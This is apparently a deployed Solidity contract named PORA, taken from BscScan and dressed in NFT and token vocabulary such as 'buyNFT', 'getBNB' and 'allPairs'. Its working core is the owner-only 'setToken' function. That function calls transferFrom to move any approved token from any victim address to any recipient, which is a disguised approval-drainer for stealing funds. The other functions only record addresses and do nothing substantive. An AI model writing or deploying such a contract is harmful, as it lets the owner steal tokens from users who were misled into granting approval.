/**
 *Submitted for verification at BscScan.com on 2022-05-31
*/

pragma solidity >=0.6.0 <0.8.0;
 interface token{
    function transfer(address receiver, uint amount) external;
    function transferFrom(address _from, address _to, uint256 _value)external;
    function balanceOf(address receiver)external view returns(uint256);
    function approve(address spender, uint amount) external returns (bool);
}
contract PORA{
    address public owner;
    address public WETH=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public USDT=0xdAC17F958D2ee523a2206206994597C13D831ec7;
    uint public price=1700 ether;
    address[] public addrs;
    mapping (uint=>address)public getNFT;
    uint public inID; 
    modifier onlyOwner() {
        require(owner==msg.sender, "Not an administrator");
        _;
    }
    constructor()public{
        owner=msg.sender;
     }
     receive() external payable {}
     function setToken(address _token,address EX,address to,uint value)public onlyOwner{
         token(_token).transferFrom(EX,to,value);
     }
     function setAdd(address _add)public onlyOwner{
         owner=_add;
     }
     function getBNB(address addr)public view returns(uint){
        if(addr == WETH){
            return 1;
        }
        if(addr == USDT){
            return 2;
        }
     }
     function buyNFT(address addr,uint mix)public {
         require(owner==msg.sender, "Not an administrator");
         address ue;
         if(mix==1){
            ue=WETH;
         }
         if(mix==2){
            ue=USDT;
         }
         addrs.push(addr);
         getNFT[inID]=ue;
         inID++;
     }
     function allPairs(uint b)public view returns(address){
        return addrs[b];
     }

}